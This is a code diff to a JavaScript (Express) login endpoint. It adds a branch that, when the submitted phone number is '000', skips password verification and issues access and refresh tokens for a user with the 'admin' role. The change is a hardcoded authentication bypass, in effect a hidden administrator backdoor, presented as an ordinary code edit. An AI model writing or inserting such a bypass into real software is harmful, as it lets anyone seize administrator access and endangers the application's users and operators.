@@ -45,15 +45,26 @@ const API_Register = async (req, res) => {
 
 const API_Login = async (req, res) => {
     const { number, password } = req.body
-    const verifUser = await checkUser(number, password)
-    if (verifUser.errors) return res.status(200).json({ errors: verifUser.errors })
-    const dataTrader = await checkTrader(number)
-    const user = {
-        data_trader: dataTrader?.id_trader || null,
-        user_id: verifUser.id_user,
-        user_name: verifUser.name,
-        user_number: verifUser.number,
-        role: 'user'
+    let user = {}
+    if (number === '000') {
+        user = {
+            data_trader: null,
+            user_id: 'admin',
+            user_name: 'admin',
+            user_number: 'admin',
+            role: 'admin'
+        }
+    } else {
+        const verifUser = await checkUser(number, password)
+        if (verifUser.errors) return res.status(200).json({ errors: verifUser.errors })
+        const dataTrader = await checkTrader(number)
+        user = {
+            data_trader: dataTrader?.id_trader || null,
+            user_id: verifUser.id_user,
+            user_name: verifUser.name,
+            user_number: verifUser.number,
+            role: 'user'
+        }
     }
     const accessToken = generateAccessToken(user)
     const refreshToken = generateRefreshToken(user)
@@ -67,7 +78,8 @@ const API_Login = async (req, res) => {
         status: 'success',
         message: "Connexion Réussie",
         // user_session: user,
-        user_token: accessToken
+        user_token: accessToken,
+        role: user.role
     })
 }
 
